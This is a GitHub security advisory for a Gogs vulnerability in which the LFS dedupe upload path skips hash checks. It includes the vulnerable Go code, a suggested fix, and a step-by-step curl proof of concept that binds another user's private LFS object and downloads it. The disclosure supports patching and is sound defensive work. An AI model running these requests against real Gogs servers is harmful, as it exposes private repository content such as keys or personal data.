# [H] Gogs: LFS dedupe path leaks private repo content across tenants

## Summary
Severity: High
Advisory: GHSA-6p9m-q3jp-47h4
CVE: CVE-2026-52812
CWE: CWE-345, CWE-639, CWE-862
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-6p9m-q3jp-47h4
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.3

## Details
Summary

Git LFS storage is content-addressed by OID alone (`<LFS-root>/<oid[0]>/<oid[1]>/<oid>`) but per-repo authorization lives in the `lfs_object` table keyed `(repo_id, oid)`. `serveUpload` skips re-uploading when the OID file already exists on disk and inserts a new `(repo_id, oid)` row pointing at it **without verifying the request body hashes to the OID being claimed**. Any user with write access to one repo can bind their repo to an OID owned by a private repo and download the original bytes via their own download endpoint.

Details

Dedupe shortcut at `internal/lfsx/storage.go:79-82`:

```go
if fi, err := os.Stat(fpath); err == nil {
    _, _ = io.Copy(io.Discard, rc)
    return fi.Size(), nil          // ← returns success with no hash check
}
```

Hash verification at `internal/lfsx/storage.go:106-108` only runs in the *new-file* branch — the dedupe path returns earlier.

`serveUpload` (`internal/route/lfs/basic.go:78-114`) trusts that success and inserts the per-repo binding:

```go
_, err := h.store.GetLFSObjectByOID(c.Req.Context(), repo.ID, oid)   // per-repo
if err == nil { /* already linked, drain & return 200 */ }
written, err := s.Upload(oid, c.Req.Request.Body)
err = h.store.CreateLFSObject(c.Req.Context(), repo.ID, oid, written, s.Storage())
```

`CreateLFSObject` is an unconditional `INSERT` on `(repo_id, oid)` with no check that the OID is referenced by the requesting repo's git history.

`serveDownload` at `internal/route/lfs/basic.go:42-72` only consults the per-repo row, then streams from the shared content-addressed file.

Suggested fix

1. In `LocalStorage.Upload`, when `os.Stat(fpath) == nil`, hash the request body via `io.TeeReader` and `ErrOIDMismatch` on disagreement — same code path as the new-file branch already uses. The "client retries after partial failure" use case still works; the retry just has to send the correct content.
2. Optional second layer: in `serveUpload`, refuse `CreateLFSObject` unless the OID is referenced by an LFS pointer in the requesting repo's refs.

PoC

Tested against gogs at HEAD `d7571322` (also reproduces on `v0.14.2`, paths are `internal/lfsutil/storage.go` and identical logic).

### Reproduction prerequisites
- Running gogs ≥ 0.12.0 with `[lfs] ENABLED = true`.
- Two accounts: `alice` (private repo `secrets`) and `bob` (any repo `bob/scratch`); bob has no access to `alice/secrets`.
- An OID known to be present in `alice/secrets` — leaked LFS pointer file in any public ancestor commit, stale fork, support ticket, or any side channel. Brute force is infeasible (256-bit).

### Setup (testbed simulation of the victim's prior state)

```sh
GOGS=https://gogs.example
ALICE_AUTH='-u alice:alice_password'
BOB_AUTH='-u bob:bob_password'

VICTIM_BYTES='victim secret content'
OID=$(printf %s "$VICTIM_BYTES" | sha256sum | cut -d' ' -f1)
SIZE=$(printf %s "$VICTIM_BYTES" | wc -c)

# After this, file lives at <conf.LFS.ObjectsPath>/<OID[0]>/<OID[1]>/<OID>
# and (alice/secrets, OID) row exists in lfs_object.
printf %s "$VICTIM_BYTES" | curl -sS $ALICE_AUTH \
  -H 'Content-Type: application/octet-stream' \
  -X PUT --data-binary @- \
  "$GOGS/alice/secrets.git/info/lfs/objects/basic/$OID"
```

### Attack — bob has only `$OID`, not `$VICTIM_BYTES`

```sh
unset VICTIM_BYTES   # attacker has no idea what the file contains

# 1. Confirm bob has no claim on $OID.
curl -sS $BOB_AUTH \
  -H 'Accept: application/vnd.git-lfs+json' \
  -H 'Content-Type: application/vnd.git-lfs+json' \
  -X POST "$GOGS/bob/scratch.git/info/lfs/objects/batch" \
  --data "{\"operation\":\"download\",\"objects\":[{\"oid\":\"$OID\",\"size\":$SIZE}]}"
# → "actions":{"error":{"code":404,"message":"Object does not exist"}}

# 2. PUT garbage to bob's LFS endpoint. The on-disk OID file already exists
#    so LocalStorage.Upload takes the dedupe shortcut: drains the body
#    without hashing, returns alice's size; CreateLFSObject inserts (bob, OID).
curl -sS $BOB_AUTH \
  -H 'Content-Type: application/octet-stream' \
  -X PUT --data-binary 'irrelevant attacker-controlled bytes' \
  "$GOGS/bob/scratch.git/info/lfs/objects/basic/$OID"
# → HTTP/1.1 200 OK

# 3. Download via bob's repo — gogs streams alice's bytes.
curl -sS $BOB_AUTH "$GOGS/bob/scratch.git/info/lfs/objects/basic/$OID" -o /tmp/leaked
cat /tmp/leaked
# → victim secret content
sha256sum /tmp/leaked | cut -d' ' -f1
# → matches $OID exactly
```

### Independent confirmation against the source

```sh
git clone https://github.com/gogs/gogs.git && cd gogs
git checkout d7571322

sed -n '63,114p' internal/lfsx/storage.go      # dedupe at 79-82, hash check at 106 only in new-file branch
sed -n '74,117p' internal/route/lfs/basic.go   # serveUpload calls CreateLFSObject regardless of dedupe path
grep -n 'primaryKey' internal/database/lfs.go  # composite (RepoID, OID) PK — multiple repos can share an OID row
```

Impact

- **Cross-tenant disclosure of any LFS object on the instance.** Attacker needs HTTP write to one repo + knowledge of a target OID; storage path is global, no per-repo isolation.
- LFS commonly stores certificates/keys, firmware blobs, ML model weights, datasets containing PII, packaged installers — all extracted byte-for-byte.
- Persistent: the `(bob/scratch, OID)` row pins read access until manually deleted; removing bob's repo write access does not revoke prior binds. No artefact on victim's side beyond a 200 in the LFS access log.

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-6p9m-q3jp-47h4
- https://nvd.nist.gov/vuln/detail/CVE-2026-52812
- https://github.com/gogs/gogs/pull/8333
- https://github.com/gogs/gogs/commit/f35a767af74e05342bafc6fdda02c791816426f8
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/releases/tag/v0.14.3
